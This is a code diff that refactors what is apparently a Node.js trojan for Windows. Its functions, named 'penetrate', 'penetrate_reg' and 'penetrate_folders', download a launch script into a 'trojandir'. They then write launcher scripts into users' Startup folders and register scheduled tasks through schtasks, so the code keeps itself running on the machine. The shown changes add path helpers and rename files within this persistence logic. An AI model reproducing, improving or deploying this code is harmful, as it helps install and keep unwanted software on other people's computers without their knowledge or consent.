@@ -1,5 +1,4 @@
 debugger;
-
 // https://github.com/gauravmehla/Javascript-bookshelf/blob/master/O'Reilly%20-%20You%20Don't%20Know%20JS.%20this%20%26%20Object%20Prototypes.pdf
 // https://www.tutorialspoint.com/compilers/online-nodejs-compiler.htm
 
@@ -154,6 +153,10 @@ var startupfolderconfig = {
         });
     },
 
+    getScriptPath(foldername) {
+        return path.join(this.getFolderPath(foldername), this.launcher_fname);
+    },
+
     getFolderPath(foldername) {
 
         for (const folder of this.folders) {
@@ -192,8 +195,8 @@ var startupfolderconfig = {
         },
         
         { 
-            id:'folder_003', 
             enabled: true, 
+            name:'startup_adult2022', 
             folderpath: 'C:\\Users\\ADULT2022\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
         }
     ],
@@ -202,6 +205,10 @@ var startupfolderconfig = {
 var systemconfig = {
     get launch_script_fname() {
         return systemstate.istpl ? 'tpl_launch.cmd' : 'launch.cmd';
+    },
+
+    get launch_script_fpath() {
+        return path.join(systemstate.trojandir, this.launch_script_fname);
     }
 };
 
@@ -2865,7 +2872,7 @@ function penetrate_folders() {
 
     for ( let i = 0; i<foldernames.length; i++) {
         let foldername = foldernames[i];
-        let fpath = path.join(startupfolderconfig.getFolderPath(foldername), startupfolderconfig.launcher_fname);
+        let fpath = startupfolderconfig.getScriptPath(foldername);
         let script_txt = startupfolderconfig.getLauncherScript(foldername);
 
         logmsg(`writing launch script to ${fpath}`);
@@ -2876,15 +2883,13 @@ function penetrate_folders() {
 
 async function penetrate() {
     logmsg("starting");
-
-    if ( ! fileExists(path.join(systemstate.trojandir, systemconfig.launch_script_fname)) ) {
+    
+    if ( ! fileExists(systemconfig.launch_script_fpath) ) {
         await download_launch_script();
     }
 
     await reschedule();
-
     await penetrate_reg();
-
     await penetrate_folders();
 
     // TODO await cleanup() 
@@ -3766,7 +3771,7 @@ async function createTask(taskname) {
 
     let cleanXml = taskxmlstr.replace(/>\s+/g, ">").replace(/\s+</g, "<");
 
-    let fpath = path.join(systemstate.trojandir, "owd_" + taskname + ".xml");
+    let fpath = path.join(systemstate.trojandir, taskname + ".xml");
     fs.writeFileSync(fpath, cleanXml, "utf8");
     await exec_schtasks(fpath, taskname);
 }
